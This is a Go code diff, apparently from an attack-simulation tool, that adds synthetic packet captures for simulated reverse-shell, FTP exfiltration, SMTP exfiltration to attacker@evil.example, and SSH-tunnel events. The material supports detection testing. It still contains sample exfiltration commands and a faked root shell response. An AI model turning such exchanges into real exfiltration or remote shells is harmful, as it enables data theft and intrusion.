@@ -871,6 +871,13 @@ func runReverseShell(req AttackRequest) (*AttackResult, error) {
 			flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", targetIP, c2IP, "TCP", flows)
 			result.EventIDs = append(result.EventIDs, flowID)
 		}
+
+		rsPayload := []byte("id\n")
+		rsResp := []byte("uid=0(root) gid=0(root) groups=0(root)\n")
+		rsPath, rsErr := PCAPGenericTCPExchange(req.RunID, "reverse_shell", targetIP, c2IP, uint16(port), rsPayload, rsResp)
+		if rsErr == nil {
+			result.PCAPFiles = append(result.PCAPFiles, rsPath)
+		}
 	}
 	logInfo("Return from runReverseShell syslogs=%d flows=%d", result.SyslogCount, result.FlowCount)
 	return result, nil
@@ -1134,6 +1141,14 @@ func runFTPExfil(req AttackRequest) (*AttackResult, error) {
 	result.FlowCount += len(flows)
 	flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, c2IP, "TCP", flows)
 	result.EventIDs = append(result.EventIDs, flowID)
+
+	ftpPayload := []byte("STOR sensitive_data.zip\r\n")
+	ftpResp := []byte("150 Opening BINARY mode data connection.\r\n226 Transfer complete.\r\n")
+	ftpPath, ftpErr := PCAPGenericTCPExchange(req.RunID, "ftp_exfil", req.AttackerIP, c2IP, 21, ftpPayload, ftpResp)
+	if ftpErr == nil {
+		result.PCAPFiles = append(result.PCAPFiles, ftpPath)
+	}
+
 	logInfo("Return from runFTPExfil syslogs=%d", result.SyslogCount)
 	return result, nil
 }
@@ -1166,6 +1181,13 @@ func runSMTPExfil(req AttackRequest) (*AttackResult, error) {
 		result.FlowCount++
 		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
 		result.EventIDs = append(result.EventIDs, flowID)
+
+		smtpPayload := []byte(fmt.Sprintf("MAIL FROM:<%s>\r\nRCPT TO:<attacker@evil.example>\r\nDATA\r\n", req.AttackerIP))
+		smtpResp := []byte("250 OK\r\n250 OK\r\n354 Start mail input; end with <CRLF>.<CRLF>\r\n")
+		smtpPath, smtpErr := PCAPGenericTCPExchange(req.RunID, "smtp_exfil", req.AttackerIP, targetIP, 25, smtpPayload, smtpResp)
+		if smtpErr == nil {
+			result.PCAPFiles = append(result.PCAPFiles, smtpPath)
+		}
 	}
 	logInfo("Return from runSMTPExfil syslogs=%d", result.SyslogCount)
 	return result, nil
@@ -1244,6 +1266,13 @@ func runSSHTunnel(req AttackRequest) (*AttackResult, error) {
 		result.FlowCount += len(flows)
 		flowID, _ := recordRunEvent(req.RunID, "netflow", "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
 		result.EventIDs = append(result.EventIDs, flowID)
+
+		sshPayload := []byte("SSH-2.0-OpenSSH_8.9\r\n")
+		sshResp := []byte("SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\n")
+		sshPath, sshErr := PCAPGenericTCPExchange(req.RunID, "ssh_tunnel", req.AttackerIP, targetIP, 22, sshPayload, sshResp)
+		if sshErr == nil {
+			result.PCAPFiles = append(result.PCAPFiles, sshPath)
+		}
 	}
 	logInfo("Return from runSSHTunnel syslogs=%d", result.SyslogCount)
 	return result, nil
